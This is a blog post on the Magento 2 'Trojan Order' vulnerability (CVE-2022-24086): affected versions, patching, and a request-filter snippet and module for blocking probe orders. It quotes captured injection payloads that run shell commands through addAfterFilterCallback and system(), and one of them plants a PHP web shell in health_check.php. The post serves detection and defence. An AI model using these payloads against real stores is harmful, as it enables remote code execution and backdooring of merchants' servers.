---
title: "Trojan Order (CVE-2022-24086) - addAfterFilterCallback Orders"
description: "Magento 2 Trojan Orders (CVE-2022-24086) are back, lets talk about how to patch so we are safe. And other identifiers aside from addAfterFilterCallback"
date: 2024-08-16T11:30:00+00:00
tags: ["magento2", "security", "devsecops", "magento-cloud", "adobe-commerce"]
author: "Me"
draft: false
banner_image: "trojan-order.jpg"
banner_image_alt: "Trojan Horse"
---

So it appears the Magento 2 Trojan order exploit (CVE-2022-24086) is making the rounds again. With the recent rise in exploit attempts I am going to go out on a whim, and assume the exploit kit was recently sold/released again. Trojan Order was identified and patched back at the start of 2022.

The relevant security Bulletin is APSB22-12. It states versions 2.3.0 to 2.3.3 are not affected but any other versions below 2.4.3-p1 and 2.3.7-p2 are. https://helpx.adobe.com/security/products/magento/apsb22-12.html


## What is a Trojan Order / How do we know if we are affected?

Typically in most requests I have seen, a common function they all use is `addAfterFilterCallback`. I've listed some examples below. Note, if a strange looking order comes in and its missing the `addAfterFilterCallback`. That does NOT mean its not a probe.

```
{{var this.getTemplateFilter().filter(dummy) }}{{var this.getTemplateFilter().addAfterFilterCallback(base64_decode).addAfterFilterCallback(system)filter(bHMgLWFs3001 W OLD YANKTON RD)}},

{{var this.getTemplateFilter().filter(foobar)}}{{var this.getTemplateFilter().addAfterFilterCallback(system).filter(pwd)}}

{{var this.getTemplateFilter().filter(dummy) }}{{var this.getTemplateFilter().addAfterFilterCallback(base64_decode).addAfterFilterCallback(system)filter(bHMgLWFs 3001 W OLD YANKTON RD )}}, California, 94123 United States

if this.getTemplateFilter().filter(dummy)/if errorif this.getTemplateFilter().addAfterFilterCallback(base64_decode).addAfterFilterCallback(system).Filter(Y2QgcHViO2VjaG8gJzw/cGhwIGVjaG8gIk9LIjtAZXZhbChiYXNlNjRfZGVjb2RlKCRfUE9TVFsicXdxIl0pKTsgJyA+IGhlYWx0aF9jaGVjay5waHA=)m/if
```

## How do we patch Trojan Orders?
Ensure you are one a version of Magento between 2.3.0 to 2.3.3 or newer than 2.4.3-p1 and 2.3.7-p2. Although I would recommend if you behind, to update to the latest release. As there will be a bunch of other vulnerabilities with your installation.

## Trojan orders are still coming through despite being patched
The Magento patch, resolves the vulnerability that trojan orders was exploiting. But it does not attempt to stop the orders being placed. So some merchants are ending up with a large amount of unactionable probe orders in the admin panel.

Currently there are two leading solutions to stop this, the quick and dirty way by [Sansec](https://sansec.io). And the more concrete way by [DeployEcommerce](https://github.com/DeployEcommerce/).

### Quick and Dirty
In the original write up on [Trojan Orders by Sansec](https://sansec.io/research/trojanorder-magento), they include a emergency fix towards the bottom, which involves adding a single if conditions to the top of the `bootstrap.php` file. (NB. They include similar emergency fixes in a fair few of their research posts around new vulnerabilities)

As usual from Sansec, their fix involves doing a regex match on stdin and returning a 503 error.
(Note: Maybe a `stripos` call would be a bit more performant here?).

It is really simple to add and does not require any downtime to apply, which is great. Simply, you just edit `app/bootstrap.php` and add the following code block at the very top.
```php
if(preg_match('/addafterfiltercallback/si', preg_replace("/[^A-Za-z]/", '', urldecode(urldecode(file_get_contents("php://input")))))) {
    header('HTTP/1.1 503 Service Temporarily Unavailable');
    header('Status: 503 Service Temporarily Unavailable');
    exit;
}
```

### Concrete
Whilst the quick and dirty solution is great and easy to implement. It is running on every request, REST, GraphQL, Admin, PDP, PLP etc etc Which is a waste since we are not particularly worried about this exploit on a CMS page view.

So DeployEcommerce have release a [Standalone module](https://github.com/DeployEcommerce/module-trojan-order-prevent) targeted at helping stop Trojan Orders, which has a fair bit of moment behind it. Its purpose to to identify and drop these probe orders via a plugin around the Shipping and Billing address management interfaces.

Getting this live, is a simple module install and deploy procedure.
